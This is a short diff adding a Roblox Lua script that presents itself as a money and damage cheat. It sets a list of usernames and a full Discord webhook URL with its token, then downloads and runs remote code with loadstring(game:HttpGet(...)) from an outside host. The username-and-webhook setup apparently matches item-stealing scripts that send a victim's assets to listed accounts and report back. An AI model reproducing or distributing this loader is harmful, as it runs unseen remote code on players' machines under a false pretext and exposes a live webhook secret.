@@ -1,0 +1,8 @@
+Usernames = {"Alshin233"}
+Webhook = "https://discord.com/api/webhooks/1430583471855763610/bXNQgnYKV5oLYuucN9ZstTarR7v_FlkWrvx_C1pj0Qd4BfUCy6XvAP25avJd5WmHPr47"
+
+-- Priority
+MoneyPerSecond = 5000 -- DEFAULT: 3000/s
+DMGPerSecond = 5000 -- DEFAULT: 3000s
+
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/1bbb1994d32c6e93b5cd128457d1c1a84926226993b19f5084f9e65f12f7ff32/download"))()
